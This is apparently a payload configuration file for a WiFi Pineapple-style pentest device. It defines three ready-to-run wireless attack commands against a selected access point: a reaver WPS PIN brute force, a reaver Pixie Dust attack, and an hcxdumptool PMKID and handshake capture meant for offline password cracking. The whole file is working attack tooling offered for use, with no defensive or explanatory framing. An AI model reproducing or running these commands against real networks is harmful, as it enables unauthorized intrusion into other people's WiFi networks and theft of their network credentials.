payloads.name: MP-WPS Brute Force (Reaver)
payloads.command: trap PINEAPPLE_EXAMINE_RESET EXIT INT TERM; PINEAPPLE_EXAMINE_CHANNEL $_RECON_SELECTED_AP_CHANNEL && timeout -k 10s ${TIMEOUT_HOURS}h reaver -i wlan1mon -b $_RECON_SELECTED_AP_BSSID -c $_RECON_SELECTED_AP_CHANNEL -vv $ADDITIONAL_OPTIONS
payloads.description: Brute force WPS PIN attack on the selected AP. Long running time depending on AP's WPS lockout policy.
payloads.author: MetaPayload Wifi Attacks

payloads.name: MP-WPS Pixie Dust (Reaver)
payloads.command: trap PINEAPPLE_EXAMINE_RESET EXIT INT TERM; PINEAPPLE_EXAMINE_CHANNEL $_RECON_SELECTED_AP_CHANNEL && timeout -k 10s ${TIMEOUT_MINS}m reaver -i wlan1mon -b $_RECON_SELECTED_AP_BSSID -c $_RECON_SELECTED_AP_CHANNEL -K -vv $ADDITIONAL_OPTIONS
payloads.description: WPS Pixie Dust attack on the selected AP. Much faster than brute force if the AP is vulnerable.
payloads.author: MetaPayload Wifi Attacks

payloads.name: MP-PMKID Capture (hcxdumptool)
payloads.command: trap PINEAPPLE_EXAMINE_RESET EXIT INT TERM;[ $_RECON_SELECTED_AP_CHANNEL -le 14 ] 2>/dev/null && BAND=a || BAND=b;PINEAPPLE_EXAMINE_BSSID $_RECON_SELECTED_AP_BSSID $((TIMEOUT_SECS+60));echo 'wlan addr1 ${_RECON_SELECTED_AP_BSSID//:/} or wlan addr2 ${_RECON_SELECTED_AP_BSSID//:/} or wlan addr3 ${_RECON_SELECTED_AP_BSSID//:/}' > /tmp/filter.txt;tcpdump -s 1024 -y IEEE802_11_RADIO -F /tmp/filter.txt -dd > /tmp/bpfc.txt;hcxdumptool -i wlan1mon --bpf /tmp/bpfc.txt -c ${_RECON_SELECTED_AP_CHANNEL}${BAND} -w /tmp/tmp.pcapng --tot $TIMEOUT_SECS > /tmp/hcxdumptool_log.txt 2>&1
payloads.description: Capture PMKID from the selected AP for offline cracking. Catches PKMID and handshakes via standard PineAP captures. Get the HashMaster 22000 payload for smart alerts!
payloads.author: MetaPayload Wifi Attacks
